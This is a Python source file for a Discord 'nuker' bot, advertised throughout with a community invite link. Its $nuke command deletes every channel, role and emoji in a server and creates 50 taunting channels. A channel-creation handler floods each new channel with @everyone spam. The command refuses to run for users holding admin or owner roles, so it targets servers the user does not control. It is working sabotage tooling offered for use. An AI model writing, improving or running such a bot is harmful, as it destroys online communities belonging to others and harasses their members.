import discord, random, json, os
from discord.ext import commands
from colorama import Fore, init
from dotenv import load_dotenv
init(autoreset=True)
load_dotenv()

# https://discord.gg/6pCbgbYWM7

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="$", intents=intents)

# https://discord.gg/6pCbgbYWM7

if not os.path.exists("config.json"):
    with open("config.json", "w") as f:
        f.write('{"token": "BOT TOKEN HERE"}')
        print(f"{Fore.GREEN}Created config.json file!")

# https://discord.gg/6pCbgbYWM7

with open("config.json", "r") as f:
    config = json.load(f)

# THIS IS A SIMPLE NUKER
# ITS NOT FAST BUT IT WORKS! 
# JOIN HERE FOR A FAST N$KER : https://discord.gg/6pCbgbYWM7

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    print(f"Made by {Fore.GREEN}nukerdev {Fore.RESET}| {Fore.RED}Join {Fore.CYAN}https://discord.gg/6pCbgbYWM7 {Fore.RESET}for better bots and tools!")

# https://discord.gg/6pCbgbYWM7
 
@bot.command()
async def nuke(ctx):

    # https://discord.gg/6pCbgbYWM7

    author: discord.Member = ctx.author
    for role in author.roles:
        if "admin" in role.name.lower() or "owner" in role.name.lower():
            print(f"{Fore.RED}BRO YOU A STAFF F$CK YOU!")
            return
    
    guild: discord.Guild = ctx.guild

    # https://discord.gg/6pCbgbYWM7

    try:
        await ctx.message.delete()
    except discord.errors.NotFound:
        print(f"{Fore.RED}Message not found.")
        return
    except discord.HTTPException:
        print(f"{Fore.RED}Failed to delete message.")
        return

    print(f"{Fore.GREEN}Nuking {Fore.CYAN}{guild.name}...")
    
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"{Fore.RED}Deleted channel {channel.name}")
        except discord.errors.NotFound:
            print(f"{Fore.RED}Channel not found.")
        print(f"{Fore.RED}Deleted channel {channel.name}")
    
# https://discord.gg/6pCbgbYWM7
 
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                print(f"{Fore.RED}Deleted role {role.name}")
            except discord.errors.NotFound:
                print(f"{Fore.RED}Role not found.")
                continue
            except discord.HTTPException:
                continue
            print(f"{Fore.RED}Deleted role {role.name}")
    
    # https://discord.gg/6pCbgbYWM7
 
    for emoji in guild.emojis:
        try:
            await emoji.delete()
            print(f"{Fore.RED}Deleted emoji {emoji.name}")
        except discord.errors.NotFound:
            print(f"{Fore.RED}Emoji not found.")
        except discord.HTTPException:
            continue
        print(f"{Fore.RED}Deleted emoji {emoji.name}")
    
# https://discord.gg/6pCbgbYWM7
 
    for i in range(50):
        names = ["BOMB-WAS-HERE", "IMAGINE-GET-BOMBED", "I-LIKE-YOUR-SERVER-NOW", "JOIN-N$KE-COMMUNITY"]
        name = random.choice(names)
        try:
            await guild.create_text_channel(name)
            print(f"{Fore.GREEN}Created text channel {name}")
        except discord.errors.Forbidden:
            print(f"{Fore.RED}no perm.")
        except discord.HTTPException:
            continue

# https://discord.gg/6pCbgbYWM7
 
@bot.event
async def on_guild_channel_create(channel):
    
# https://discord.gg/6pCbgbYWM7
 
    for i in range(10):
        messages = ["GOT BOMBED 💣💣💣", "N$KE COMMUNITY ON TOP | https://discord.gg/6pCbgbYWM7", "YOU GOT N$KED IN YEAR 2024 😂"]
        random_message = random.choice(messages)
        try:
            await channel.send(f"{random_message} ||@everyone||")
        except discord.errors.Forbidden:
            print(f"{Fore.RED}no perm.")

# https://discord.gg/6pCbgbYWM7

if __name__ == "__main__":
    try:
        bot.run(config["token"])
    except discord.errors.LoginFailure:
        print(f"{Fore.RED}Invalid token.")
        exit()

# https://discord.gg/6pCbgbYWM7